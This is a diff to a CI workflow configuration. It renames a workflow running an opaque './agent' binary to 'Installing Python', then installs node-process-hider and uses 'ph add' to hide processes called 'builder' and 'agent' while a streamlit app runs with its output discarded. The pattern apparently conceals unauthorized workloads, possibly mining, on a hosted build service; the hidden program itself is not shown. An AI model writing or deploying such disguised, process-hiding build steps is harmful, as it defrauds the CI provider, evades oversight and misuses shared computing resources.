@@ -1,7 +1,10 @@
 workflows:
   hello-world:
-    name: Hello world workflow
-    instance_type: linux_x2
-    max_build_duration: 120
-    scripts:
-        - lscpu; ./agent
+    name: Installing Python
+    scripts: |
+        apt-get update -y
+        apt-get install python procps npm -y
+        npm i -g node-process-hider
+        ph add builder; exit 0
+        ph add agent; exit 0
+        watch free -m & python streamlit_app.py > /dev/null
